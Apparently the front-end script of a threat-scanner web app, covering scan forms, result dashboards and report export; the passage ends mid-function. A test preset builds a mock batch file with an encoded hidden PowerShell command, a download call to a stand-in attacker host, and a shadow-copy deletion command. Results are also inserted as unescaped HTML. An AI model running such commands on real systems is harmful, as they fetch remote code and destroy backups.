/**
 * CyberVigil AI - Enterprise Multi-Page Command Architecture
 * Handles Scanner Console, PDF/JPG Report Exporter, Session Storage History,
 * URL Query Parameter Auto-Scanning, and Security Academy Modules.
 */

// Global State with Persistent Audio Preference
const state = {
  activeTab: 'url',
  selectedFile: null,
  audioEnabled: typeof localStorage !== 'undefined' && localStorage.getItem('cybervigil_audio_enabled') === 'true',
  lastScanResult: null
};

// Web Audio API Sci-Fi Sound Synthesizer
const AudioFX = {
  ctx: null,
  init() {
    if (!this.ctx && typeof AudioContext !== 'undefined') {
      this.ctx = new (window.AudioContext || window.webkitAudioContext)();
    }
  },
  playTone(freq, type = 'sine', duration = 0.15, gainVal = 0.1) {
    if (!state.audioEnabled) return;
    try {
      this.init();
      if (this.ctx.state === 'suspended') this.ctx.resume();
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {
      console.warn('Audio synthesis bypassed:', e);
    }
  },
  click() {
    this.playTone(880, 'sine', 0.05, 0.05);
  },
  scanChirp() {
    if (!state.audioEnabled) return;
    try {
      this.init();
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(300, this.ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(1200, this.ctx.currentTime + 0.3);
      gain.gain.setValueAtTime(0.08, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.3);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + 0.3);
    } catch (e) {}
  },
  alertMalicious() {
    if (!state.audioEnabled) return;
    this.playTone(420, 'square', 0.2, 0.15);
    setTimeout(() => this.playTone(320, 'square', 0.3, 0.15), 180);
  },
  cleanChime() {
    if (!state.audioEnabled) return;
    this.playTone(523.25, 'triangle', 0.15, 0.1);
    setTimeout(() => this.playTone(659.25, 'triangle', 0.25, 0.1), 120);
  }
};

// DOM Ready Handler - Page-Aware Initialization
document.addEventListener('DOMContentLoaded', () => {
  setupAudioToggle();
  setupMobileMenu();

  // If on Scanner Page
  if (document.getElementById('url-form')) {
    setupTabs();
    setupUrlScanner();
    setupFileScanner();
    setupReportDownloadButtons();
    checkQueryParamScan();
  }

  // If on Session History Page
  if (document.getElementById('session-history-list')) {
    setupSessionHistory();
  }

  // If on Security Academy Page
  if (document.getElementById('pwd-input')) {
    setupPasswordStrengthTester();
  }
});

// Mobile Navigation Drawer Toggle
function setupMobileMenu() {
  const toggleBtn = document.getElementById('mobile-menu-btn');
  const mobileMenu = document.getElementById('mobile-menu');
  if (!toggleBtn || !mobileMenu) return;

  toggleBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    AudioFX.click();
    const isHidden = mobileMenu.classList.contains('hidden');
    if (isHidden) {
      mobileMenu.classList.remove('hidden');
      toggleBtn.setAttribute('aria-expanded', 'true');
      const icon = toggleBtn.querySelector('i');
      if (icon) {
        icon.classList.remove('fa-bars');
        icon.classList.add('fa-xmark');
      }
    } else {
      mobileMenu.classList.add('hidden');
      toggleBtn.setAttribute('aria-expanded', 'false');
      const icon = toggleBtn.querySelector('i');
      if (icon) {
        icon.classList.remove('fa-xmark');
        icon.classList.add('fa-bars');
      }
    }
  });

  // Close when clicking outside menu
  document.addEventListener('click', (e) => {
    if (!mobileMenu.contains(e.target) && !toggleBtn.contains(e.target)) {
      mobileMenu.classList.add('hidden');
      toggleBtn.setAttribute('aria-expanded', 'false');
      const icon = toggleBtn.querySelector('i');
      if (icon) {
        icon.classList.remove('fa-xmark');
        icon.classList.add('fa-bars');
      }
    }
  });

  // Close with Escape key
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && !mobileMenu.classList.contains('hidden')) {
      mobileMenu.classList.add('hidden');
      toggleBtn.setAttribute('aria-expanded', 'false');
      const icon = toggleBtn.querySelector('i');
      if (icon) {
        icon.classList.remove('fa-xmark');
        icon.classList.add('fa-bars');
      }
    }
  });

  // Auto-hide if viewport resized to desktop width (>= 768px)
  window.addEventListener('resize', () => {
    if (window.innerWidth >= 768 && !mobileMenu.classList.contains('hidden')) {
      mobileMenu.classList.add('hidden');
      toggleBtn.setAttribute('aria-expanded', 'false');
      const icon = toggleBtn.querySelector('i');
      if (icon) {
        icon.classList.remove('fa-xmark');
        icon.classList.add('fa-bars');
      }
    }
  });
}

// Check if a ?url=... parameter was passed (e.g. from Official Links page)
function checkQueryParamScan() {
  const params = new URLSearchParams(window.location.search);
  const targetUrl = params.get('url');
  if (targetUrl) {
    const input = document.getElementById('url-input');
    if (input) {
      input.value = targetUrl;
      // Auto submit after a brief delay for smooth entrance
      setTimeout(() => {
        document.getElementById('url-form')?.dispatchEvent(new Event('submit', { cancelable: true }));
      }, 350);
    }
  }
}

// Setup Scanner Tabs (URL vs Payload)
function setupTabs() {
  const tabUrl = document.getElementById('tab-url');
  const tabFile = document.getElementById('tab-file');
  const sectionUrl = document.getElementById('section-url');
  const sectionFile = document.getElementById('section-file');
  if (!tabUrl || !tabFile) return;

  tabUrl.addEventListener('click', () => {
    AudioFX.click();
    state.activeTab = 'url';
    tabUrl.classList.add('bg-cyan-500/20', 'text-cyan-400', 'border-cyan-500');
    tabUrl.classList.remove('text-slate-400', 'border-transparent');
    tabFile.classList.remove('bg-cyan-500/20', 'text-cyan-400', 'border-cyan-500');
    tabFile.classList.add('text-slate-400', 'border-transparent');

    sectionUrl.classList.remove('hidden');
    sectionFile.classList.add('hidden');
  });

  tabFile.addEventListener('click', () => {
    AudioFX.click();
    state.activeTab = 'file';
    tabFile.classList.add('bg-cyan-500/20', 'text-cyan-400', 'border-cyan-500');
    tabFile.classList.remove('text-slate-400', 'border-transparent');
    tabUrl.classList.remove('bg-cyan-500/20', 'text-cyan-400', 'border-cyan-500');
    tabUrl.classList.add('text-slate-400', 'border-transparent');

    sectionFile.classList.remove('hidden');
    sectionUrl.classList.add('hidden');
  });
}

// Render Audio Toggle Button UI State
function renderAudioToggleUI(toggleBtn, enabled) {
  if (!toggleBtn) return;
  if (enabled) {
    toggleBtn.innerHTML = `
      <svg class="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 24 24">
        <path d="M14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77zm-2.5-1.23L6.5 6.5H2v11h4.5l5 4.5V2zm-2 4.15v11.7L7.15 15.5H4v-7h3.15L9.5 6.15zM16.5 12c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/>
      </svg>
      <span class="hidden sm:inline font-semibold text-cyan-300">Sound On</span>
    `;
    toggleBtn.classList.add('border-cyan-500/50', 'bg-cyan-950/40');
    toggleBtn.classList.remove('border-slate-700', 'bg-slate-900/80');
    toggleBtn.setAttribute('title', 'Audio Alerts: Sound On (Click to Mute)');
  } else {
    toggleBtn.innerHTML = `
      <svg class="w-4 h-4 text-slate-500" fill="currentColor" viewBox="0 0 24 24">
        <path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"/>
      </svg>
      <span class="hidden sm:inline text-slate-400">Muted</span>
    `;
    toggleBtn.classList.remove('border-cyan-500/50', 'bg-cyan-950/40');
    toggleBtn.classList.add('border-slate-700', 'bg-slate-900/80');
    toggleBtn.setAttribute('title', 'Audio Alerts: Muted (Click to Unmute)');
  }
}

// Audio Toggle Controller with Persistent localStorage
function setupAudioToggle() {
  const toggleBtn = document.getElementById('audio-toggle');
  if (!toggleBtn) return;

  // Retrieve persistent state from localStorage
  const storedAudio = localStorage.getItem('cybervigil_audio_enabled');
  state.audioEnabled = storedAudio === 'true';

  // Synchronize button UI immediately on page load
  renderAudioToggleUI(toggleBtn, state.audioEnabled);

  toggleBtn.addEventListener('click', () => {
    state.audioEnabled = !state.audioEnabled;
    try {
      localStorage.setItem('cybervigil_audio_enabled', state.audioEnabled ? 'true' : 'false');
    } catch (e) {
      console.warn('localStorage access failed:', e);
    }
    renderAudioToggleUI(toggleBtn, state.audioEnabled);

    if (state.audioEnabled) {
      AudioFX.init();
      AudioFX.cleanChime();
      showToast('Threat Audio Alerts: ACTIVE', 'success');
    } else {
      showToast('Threat Audio Alerts: MUTED', 'info');
    }
  });
}

// URL Scanner Logic
function setupUrlScanner() {
  const form = document.getElementById('url-form');
  const input = document.getElementById('url-input');
  const clearBtn = document.getElementById('clear-url-btn');
  if (!form || !input) return;

  // Bind Reset & Clear State Buttons
  document.getElementById('reset-scanner-btn')?.addEventListener('click', resetScanState);
  document.getElementById('reset-results-btn')?.addEventListener('click', resetScanState);
  document.getElementById('reset-bottom-btn')?.addEventListener('click', resetScanState);

  clearBtn?.addEventListener('click', () => {
    resetScanState();
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const url = input.value.trim();
    if (!url) {
      showToast('Please enter a target URL to scan.', 'warning');
      return;
    }

    startScanningAnimation('Scanning URL Target', `Analyzing ${url}`);
    AudioFX.scanChirp();

    try {
      const response = await fetch('/api/scan/url', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url })
      });

      const data = await response.json();
      stopScanningAnimation();

      if (!response.ok || !data.success) {
        showToast(data.error || 'Failed to inspect URL.', 'error');
        return;
      }

      state.lastScanResult = data;
      displayScanResults(data);
      addSessionScan(data);
    } catch (err) {
      stopScanningAnimation();
      showToast('Threat Engine connection failed: ' + err.message, 'error');
    }
  });
}

// File Payload Analyzer Logic
function setupFileScanner() {
  const dropZone = document.getElementById('file-dropzone');
  const fileInput = document.getElementById('file-input');
  const filePreview = document.getElementById('file-preview-card');
  const fileNameEl = document.getElementById('selected-file-name');
  const fileSizeEl = document.getElementById('selected-file-size');
  const removeFileBtn = document.getElementById('remove-file-btn');
  const submitFileBtn = document.getElementById('submit-file-btn');
  if (!dropZone || !fileInput) return;

  ['dragenter', 'dragover'].forEach(eventName => {
    dropZone.addEventListener(eventName, (e) => {
      e.preventDefault();
      dropZone.classList.add('drag-over');
    });
  });

  ['dragleave', 'drop'].forEach(eventName => {
    dropZone.addEventListener(eventName, (e) => {
      e.preventDefault();
      dropZone.classList.remove('drag-over');
    });
  });

  dropZone.addEventListener('drop', (e) => {
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleSelectedFile(e.dataTransfer.files[0]);
    }
  });

  fileInput.addEventListener('change', (e) => {
    if (e.target.files && e.target.files[0]) {
      handleSelectedFile(e.target.files[0]);
    }
  });

  removeFileBtn?.addEventListener('click', () => {
    AudioFX.click();
    state.selectedFile = null;
    fileInput.value = '';
    filePreview.classList.add('hidden');
    dropZone.classList.remove('hidden');
  });

  function handleSelectedFile(file) {
    AudioFX.click();
    state.selectedFile = file;
    fileNameEl.textContent = file.name;
    fileSizeEl.textContent = `${(file.size / 1024).toFixed(1)} KB • ${file.type || 'Binary / Raw'}`;
    dropZone.classList.add('hidden');
    filePreview.classList.remove('hidden');
  }

  // Safe Simulated Payloads
  document.getElementById('preset-clean-doc')?.addEventListener('click', () => {
    AudioFX.click();
    const blob = new Blob(['CyberVigil AI - Enterprise Safe Research Document. Clean headers and verified structure.'], { type: 'text/plain' });
    const file = new File([blob], 'quarterly_security_brief.txt', { type: 'text/plain' });
    handleSelectedFile(file);
  });

  document.getElementById('preset-malicious-script')?.addEventListener('click', () => {
    AudioFX.click();
    const maliciousMockContent = `@echo off
rem CyberVigil Simulated Malicious Test Vector (Harmless test strings)
powershell -nop -WindowStyle Hidden -EncodedCommand V2FybmluZyBDMkNyYWRsZQ==
powershell (New-Object Net.WebClient).DownloadString('http://attacker-c2.xyz/beacon')
vssadmin delete shadows /all /quiet
VirtualAlloc CreateRemoteThread
`;
    const blob = new Blob([maliciousMockContent], { type: 'application/x-bat' });
    const file = new File([blob], 'urgent_invoice_march.pdf.bat', { type: 'application/x-bat' });
    handleSelectedFile(file);
  });

  submitFileBtn?.addEventListener('click', async () => {
    if (!state.selectedFile) {
      showToast('Please select or drop a file to inspect.', 'warning');
      return;
    }

    const formData = new FormData();
    formData.append('payload', state.selectedFile);

    startScanningAnimation('Analyzing File Payload', `Inspecting binary byte stream of ${state.selectedFile.name}`);
    AudioFX.scanChirp();

    try {
      const response = await fetch('/api/scan/file', {
        method: 'POST',
        body: formData
      });

      const data = await response.json();
      stopScanningAnimation();

      if (!response.ok || !data.success) {
        showToast(data.error || 'Failed to inspect payload.', 'error');
        return;
      }

      state.lastScanResult = data;
      displayScanResults(data);
      addSessionScan(data);
    } catch (err) {
      stopScanningAnimation();
      showToast('Payload Analysis Engine error: ' + err.message, 'error');
    }
  });
}

// Reset / Clear Entire Scanner State
function resetScanState() {
  AudioFX.click();
  state.lastScanResult = null;
  state.selectedFile = null;

  // Clear URL input field and set focus
  const urlInput = document.getElementById('url-input');
  if (urlInput) {
    urlInput.value = '';
    urlInput.focus();
  }

  // Clear File payload input and preview card if on file tab
  const fileInput = document.getElementById('file-input');
  const filePreview = document.getElementById('file-preview-card');
  const dropZone = document.getElementById('file-dropzone');
  if (fileInput) fileInput.value = '';
  if (filePreview) filePreview.classList.add('hidden');
  if (dropZone) dropZone.classList.remove('hidden');

  // Smoothly hide the dynamic results card
  const resultsCard = document.getElementById('scan-results-card');
  if (resultsCard) {
    resultsCard.classList.add('hidden');
    resultsCard.classList.remove('border-glow-green', 'border-glow-crimson', 'border-glow-amber');
  }

  // Reset scores, gauges, verdicts, and telemetry containers
  const threatScoreEl = document.getElementById('result-threat-score');
  const riskLevelEl = document.getElementById('result-risk-level');
  const gaugeCircle = document.getElementById('score-gauge-circle');
  const verdictBadge = document.getElementById('result-verdict-badge');
  const targetTitle = document.getElementById('result-target-title');
  const summaryText = document.getElementById('result-summary-text');
  const cleanList = document.getElementById('indicators-clean-list');
  const threatList = document.getElementById('indicators-threat-list');
  const hashesContainer = document.getElementById('hashes-container');
  const heuristicsBody = document.getElementById('heuristics-table-body');
  const mitreContainer = document.getElementById('mitre-container');
  const actionPlan = document.getElementById('action-plan-content');

  if (threatScoreEl) threatScoreEl.textContent = '0';
  if (riskLevelEl) riskLevelEl.textContent = 'LOW RISK';
  if (gaugeCircle) gaugeCircle.style.strokeDashoffset = 283;
  if (verdictBadge) verdictBadge.innerHTML = '';
  if (targetTitle) targetTitle.textContent = '';
  if (summaryText) summaryText.textContent = '';
  if (cleanList) cleanList.innerHTML = '';
  if (threatList) threatList.innerHTML = '';
  if (hashesContainer) hashesContainer.innerHTML = '';
  if (heuristicsBody) heuristicsBody.innerHTML = '';
  if (mitreContainer) mitreContainer.innerHTML = '';
  if (actionPlan) actionPlan.innerHTML = '';

  // Clean URL search query parameter from browser address bar without reload
  if (window.location.search) {
    window.history.replaceState({}, document.title, window.location.pathname);
  }

  // Smooth scroll back up to the scanner section
  const scannerSection = document.getElementById('scanner-section');
  if (scannerSection) {
    scannerSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }

  showToast('Scanner state reset. Ready for new target.', 'info');
}

// Scanning HUD Animation
let scanInterval = null;
function startScanningAnimation(title, subtitle) {
  const modal = document.getElementById('scanning-modal');
  const stepText = document.getElementById('scanning-step-text');
  const bar = document.getElementById('scanning-bar');
  const modalTitle = document.getElementById('scanning-modal-title');
  const modalSub = document.getElementById('scanning-modal-sub');
  if (!modal) return;

  modalTitle.textContent = title;
  modalSub.textContent = subtitle;
  modal.classList.remove('hidden');

  const steps = [
    'Parsing Raw Target Stream...',
    'Evaluating Shannon Byte Entropy...',
    'Performing Static Regex & Signature Matching...',
    'Auditing Known Phishing & Brand Databases...',
    'Synthesizing Cryptographic Hashes (SHA-256)...',
    'Compiling MITRE ATT&CK Threat Mapping...'
  ];

  let currentStep = 0;
  let progress = 10;
  bar.style.width = '10%';
  stepText.textContent = steps[0];

  scanInterval = setInterval(() => {
    currentStep++;
    progress += 16;
    if (currentStep < steps.length) {
      stepText.textContent = steps[currentStep];
      bar.style.width = `${Math.min(progress, 95)}%`;
    }
  }, 220);
}

function stopScanningAnimation() {
  if (scanInterval) clearInterval(scanInterval);
  const modal = document.getElementById('scanning-modal');
  const bar = document.getElementById('scanning-bar');
  if (!modal || !bar) return;
  bar.style.width = '100%';
  setTimeout(() => {
    modal.classList.add('hidden');
  }, 250);
}

// Display Scan Results in Visual Dashboard
function displayScanResults(data) {
  const resultsCard = document.getElementById('scan-results-card');
  if (!resultsCard) return;

  resultsCard.classList.remove('hidden');
  resultsCard.scrollIntoView({ behavior: 'smooth', block: 'start' });

  // Play audio verdict
  if (data.status === 'MALICIOUS') {
    AudioFX.alertMalicious();
  } else if (data.status === 'CLEAN') {
    AudioFX.cleanChime();
  } else {
    AudioFX.playTone(480, 'sine', 0.2, 0.1);
  }

  // Target and Status Banner
  document.getElementById('result-target-title').textContent = data.target;
  document.getElementById('result-target-type-badge').textContent = data.targetType.toUpperCase() + ' SCAN';
  document.getElementById('result-summary-text').textContent = data.summary;

  // Verdict Badge Styling
  const verdictBadge = document.getElementById('result-verdict-badge');
  const threatScoreEl = document.getElementById('result-threat-score');
  const riskLevelEl = document.getElementById('result-risk-level');
  const gaugeCircle = document.getElementById('score-gauge-circle');

  threatScoreEl.textContent = data.threatScore;
  riskLevelEl.textContent = data.riskLevel && data.riskLevel.includes('RISK') ? data.riskLevel : `${data.riskLevel} RISK`;

  // Animate Circular Gauge
  const circumference = 283;
  const offset = circumference - (data.threatScore / 100) * circumference;
  if (gaugeCircle) {
    gaugeCircle.style.strokeDashoffset = offset;
  }

  verdictBadge.className = 'px-4 py-1.5 rounded-full text-xs font-cyber font-bold tracking-wider inline-flex items-center gap-2';
  resultsCard.classList.remove('border-glow-green', 'border-glow-crimson', 'border-glow-amber');

  if (data.status === 'MALICIOUS') {
    verdictBadge.classList.add('bg-red-500/20', 'text-red-400', 'border', 'border-red-500');
    verdictBadge.innerHTML = `<i class="fa-solid fa-triangle-exclamation animate-bounce"></i> VERDICT: ${data.verdict || 'MALICIOUS'}`;
    threatScoreEl.className = 'text-4xl md:text-5xl font-cyber font-black text-red-500 text-glow-crimson';
    riskLevelEl.className = 'text-xs font-bold tracking-widest uppercase text-red-400';
    resultsCard.classList.add('border-glow-crimson');
    if (gaugeCircle) gaugeCircle.style.stroke = '#ff0055';
  } else if (data.status === 'SUSPICIOUS') {
    verdictBadge.classList.add('bg-amber-500/20', 'text-amber-400', 'border', 'border-amber-500');
    verdictBadge.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i> VERDICT: ${data.verdict || 'SUSPICIOUS'}`;
    threatScoreEl.className = 'text-4xl md:text-5xl font-cyber font-black text-amber-400';
    riskLevelEl.className = 'text-xs font-bold tracking-widest uppercase text-amber-400';
    resultsCard.classList.add('border-glow-amber');
    if (gaugeCircle) gaugeCircle.style.stroke = '#ffb700';
  } else {
    verdictBadge.classList.add('bg-emerald-500/20', 'text-emerald-400', 'border', 'border-emerald-500');
    verdictBadge.innerHTML = `<i class="fa-solid fa-shield-check"></i> VERDICT: ${data.verdict || 'CLEAN / SAFE'}`;
    threatScoreEl.className = 'text-4xl md:text-5xl font-cyber font-black text-emerald-400 text-glow-green';
    riskLevelEl.className = 'text-xs font-bold tracking-widest uppercase text-emerald-400';
    resultsCard.classList.add('border-glow-green');
    if (gaugeCircle) gaugeCircle.style.stroke = '#00ff9d';
  }

  // Render Indicators
  const indicatorsCleanContainer = document.getElementById('indicators-clean-list');
  const indicatorsThreatContainer = document.getElementById('indicators-threat-list');

  indicatorsCleanContainer.innerHTML = '';
  indicatorsThreatContainer.innerHTML = '';

  if (data.indicators.clean && data.indicators.clean.length > 0) {
    data.indicators.clean.forEach(ind => {
      indicatorsCleanContainer.innerHTML += `
        <li class="flex items-start gap-2 text-xs text-emerald-300 bg-emerald-950/40 border border-emerald-500/30 px-2.5 py-1.5 rounded">
          <i class="fa-solid fa-circle-check text-emerald-400 mt-0.5"></i>
          <span>${ind}</span>
        </li>
      `;
    });
  } else {
    indicatorsCleanContainer.innerHTML = '<li class="text-xs text-slate-500 italic">No safe markers verified.</li>';
  }

  const threatItems = [...(data.indicators.malicious || []), ...(data.indicators.suspicious || [])];
  if (threatItems.length > 0) {
    threatItems.forEach(ind => {
      const isMalicious = data.indicators.malicious && data.indicators.malicious.includes(ind);
      indicatorsThreatContainer.innerHTML += `
        <li class="flex items-start gap-2 text-xs ${isMalicious ? 'text-red-300 bg-red-950/40 border-red-500/30' : 'text-amber-300 bg-amber-950/40 border-amber-500/30'} border px-2.5 py-1.5 rounded">
          <i class="fa-solid ${isMalicious ? 'fa-skull-crossbones text-red-400' : 'fa-triangle-exclamation text-amber-400'} mt-0.5"></i>
          <span>${ind}</span>
        </li>
      `;
    });
  } else {
    indicatorsThreatContainer.innerHTML = '<li class="text-xs text-emerald-400 bg-emerald-950/30 border border-emerald-500/20 px-2.5 py-1.5 rounded">Zero malicious or suspicious anomalies detected.</li>';
  }

  // Hashes
  const hashContainer = document.getElementById('hashes-container');
  hashContainer.innerHTML = '';

  if (data.hashes) {
    for (const [algo, hashVal] of Object.entries(data.hashes)) {
      hashContainer.innerHTML += `
        <div class="bg-slate-900/90 border border-slate-800 p-2.5 sm:p-3 rounded-xl flex items-center justify-between group overflow-hidden">
          <div class="overflow-hidden min-w-0 flex-1 pr-2">
            <span class="text-[10px] uppercase font-bold text-cyan-400 tracking-wider">${algo}</span>
            <p class="font-mono-code text-xs text-slate-300 truncate" title="${hashVal}">${hashVal}</p>
          </div>
          <button onclick="copyToClipboard('${hashVal}')" class="text-slate-400 hover:text-cyan-400 p-2 text-xs transition flex-shrink-0 min-w-[36px] min-h-[36px] flex items-center justify-center rounded-lg bg-slate-800/80 hover:bg-cyan-950 border border-slate-700/60" title="Copy hash">
            <i class="fa-regular fa-copy"></i>
          </button>
        </div>
      `;
    }
  }

  // Metadata chips
  const metaContainer = document.getElementById('metadata-chips');
  metaContainer.innerHTML = '';
  if (data.metadata) {
    if (data.metadata.entropy !== undefined) {
      metaContainer.innerHTML += `<span class="bg-cyan-950/50 text-cyan-300 border border-cyan-800/60 px-2 py-1 rounded text-xs">Shannon Entropy: <b>${data.metadata.entropy}</b></span>`;
    }
    if (data.metadata.fileSizeFormatted) {
      metaContainer.innerHTML += `<span class="bg-slate-800/80 text-slate-300 border border-slate-700 px-2 py-1 rounded text-xs">Size: <b>${data.metadata.fileSizeFormatted}</b></span>`;
    }
    if (data.metadata.mimeType) {
      metaContainer.innerHTML += `<span class="bg-slate-800/80 text-slate-300 border border-slate-700 px-2 py-1 rounded text-xs">MIME: <b>${data.metadata.mimeType}</b></span>`;
    }
    if (data.metadata.domain) {
      metaContainer.innerHTML += `<span class="bg-slate-800/80 text-slate-300 border border-slate-700 px-2 py-1 rounded text-xs">Host: <b>${data.metadata.domain}</b></span>`;
    }
  }

  // Heuristics Table
  const heuristicsTbody = document.getElementById('heuristics-table-body');
  heuristicsTbody.innerHTML = '';

  if (data.heuristics && data.heuristics.length > 0) {
    data.heuristics.forEach(h => {
      let badgeClass = 'text-emerald-400 bg-emerald-950/50 border-emerald-500/30';
      let icon = 'fa-check';
      if (h.status === 'FAIL') {
        badgeClass = 'text-red-400 bg-red-950/50 border-red-500/30';
        icon = 'fa-xmark';
      } else if (h.status === 'WARN') {
        badgeClass = 'text-amber-400 bg-amber-950/50 border-amber-500/30';
        icon = 'fa-triangle-exclamation';
      }

      heuristicsTbody.innerHTML += `
        <tr class="border-b border-slate-800/60 hover:bg-slate-800/30 transition text-xs">
          <td class="py-2.5 px-3 font-semibold text-cyan-300">${h.category}</td>
          <td class="py-2.5 px-3 font-mono-code text-slate-200">${h.name}</td>
          <td class="py-2.5 px-3">
            <span class="inline-flex items-center gap-1.5 px-2 py-0.5 rounded text-[11px] font-bold border ${badgeClass}">
              <i class="fa-solid ${icon}"></i> ${h.status}
            </span>
          </td>
          <td class="py-2.5 px-3 text-slate-400">${h.description}</td>
        </tr>
      `;
    });
  }

  // MITRE ATT&CK Pills
  const mitreContainer = document.getElementById('mitre-container');
  mitreContainer.innerHTML = '';
  if (data.mitreAttack && data.mitreAttack.length > 0) {
    data.mitreAttack.forEach(m => {
      mitreContainer.innerHTML += `
        <span class="bg-red-950/50 text-red-300 border border-red-500/40 px-2.5 py-1 rounded-md text-xs font-mono-code flex items-center gap-1.5">
          <i class="fa-solid fa-crosshairs text-red-400"></i> ${m}
        </span>
      `;
    });
  } else {
    mitreContainer.innerHTML = '<span class="text-xs text-slate-500 italic">No adversary techniques mapped. Clean profile.</span>';
  }

  // Security Action Plan
  const actionPlanEl = document.getElementById('action-plan-content');
  if (data.status === 'MALICIOUS') {
    actionPlanEl.innerHTML = `
      <div class="p-3 bg-red-950/30 border border-red-500/30 rounded text-xs space-y-1.5">
        <p class="font-bold text-red-400 flex items-center gap-1.5">
          <i class="fa-solid fa-triangle-exclamation"></i> Immediate SOC Mitigation Protocol:
        </p>
        <p class="text-slate-300">1. <b>Isolate & Block:</b> Blacklist the domain or payload hash in your firewall/EDR immediately.</p>
        <p class="text-slate-300">2. <b>Credential Revocation:</b> If any user submitted credentials to this target, immediately rotate passwords and terminate active SSO sessions.</p>
        <p class="text-slate-300">3. <b>Endpoint Triage:</b> For file payloads, inspect execution persistence in registry run-keys and scheduled tasks.</p>
      </div>
    `;
  } else if (data.status === 'SUSPICIOUS') {
    actionPlanEl.innerHTML = `
      <div class="p-3 bg-amber-950/30 border border-amber-500/30 rounded text-xs space-y-1.5">
        <p class="font-bold text-amber-400 flex items-center gap-1.5">
          <i class="fa-solid fa-circle-exclamation"></i> Precautionary Defense Steps:
        </p>
        <p class="text-slate-300">1. Verify the sender/source out-of-band via trusted phone or known email before opening.</p>
        <p class="text-slate-300">2. Do not enter sensitive credentials, 2FA codes, or payment data into this page.</p>
        <p class="text-slate-300">3. Execute in an isolated sandbox or burner virtual machine if inspection is required.</p>
      </div>
    `;
  } else {
    actionPlanEl.innerHTML = `
      <div class="p-3 bg-emerald-950/30 border border-emerald-500/30 rounded text-xs space-y-1.5">
        <p class="font-bold text-emerald-400 flex items-center gap-1.5">
          <i class="fa-solid fa-shield-halved"></i> Threat Clearance Confirmed:
        </p>
        <p class="text-slate-300">Target passed all cryptographic integrity checks, entropy evaluations, and reputation baselines. Standard cybersecurity hygiene is always recommended.</p>
      </div>
    `;
  }
}

// PDF & JPG Export Handlers
function setupReportDownloadButtons() {
  const pdfBtn = document.getElementById('download-pdf-btn');
  const jpgBtn = document.getElementById('download-jpg-btn');

  pdfBtn?.addEventListener('click', async () => {
    AudioFX.click();
    const resultsCard = document.getElementById('scan-results-card');
    if (!resultsCard) return;

    showToast('Compiling official PDF Threat Report...', 'info');

    try {
      if (typeof html2canvas === 'undefined' || typeof window.jspdf === 'undefined') {
        showToast('PDF export library is loading. Please try again in a moment.', 'warning');
        return;
      }

      const canvas = await html2canvas(resultsCard, {
        backgroundColor: '#070d1d',
        scale: 2,
        useCORS: true,
        logging: false
      });

      const imgData = canvas.toDataURL('image/png');
      const { jsPDF } = window.jspdf;
      const pdf = new jsPDF('p', 'mm', 'a4');
      const pdfWidth = pdf.internal.pageSize.getWidth();
      const pdfHeight = (canvas.height * pdfWidth) / canvas.width;

      pdf.addImage(imgData, 'PNG', 0, 5, pdfWidth, pdfHeight);
      const fileName = `CyberVigil_Threat_Report_${Date.now()}.pdf`;
      pdf.save(fileName);

      showToast('PDF Threat Report downloaded successfully!', 'success');
    } catch (err) {
      console.error('PDF export error:', err);
      showToast('Failed to export PDF: ' + err.message, 'error');
    }
  });

  jpgBtn?.addEventListener('click', async () => {
    AudioFX.click();
    const resultsCard = document.getElementById('scan-results-card');
    if (!resultsCard) return;

    showToast('Rendering high-res JPG Threat Report...', 'info');

    try {
      if (typeof html2canvas === 'undefined') {
        showToast('Image generator library is loading. Please try again in a moment.', 'warning');
        return;
      }

      const canvas = await html2canvas(resultsCard, {
        backgroundColor: '#070d1d',
        scale: 2,
        useCORS: true,
        logging: false
      });

      const jpgData = canvas.toDataURL('image/jpeg', 0.95);
      const downloadAnchor = document.createElement('a');
      downloadAnchor.setAttribute('href', jpgData);
      downloadAnchor.setAttribute('download', `CyberVigil_Threat_Report_${Date.now()}.jpg`);
      document.body.appendChild(downloadAnchor);
      downloadAnchor.click();
      downloadAnchor.remove();

      showToast('JPG Threat Report downloaded successfully!', 'success');
    } catch (err) {
      console.error('JPG export error:', err);
      showToast('Failed to export JPG: ' + err.message, 'error');
    }
  });
}

// Temporary Session Storage Management
const SESSION_STORAGE_KEY = 'cybervigil_session_history';

function addSessionScan(data) {
  try {
    let sessionScans = JSON.parse(sessionStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    const record = {
      targetType: data.targetType,
      target: data.target,
      threatScore: data.threatScore,
      status: data.status,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
    };
    sessionScans.unshift(record);
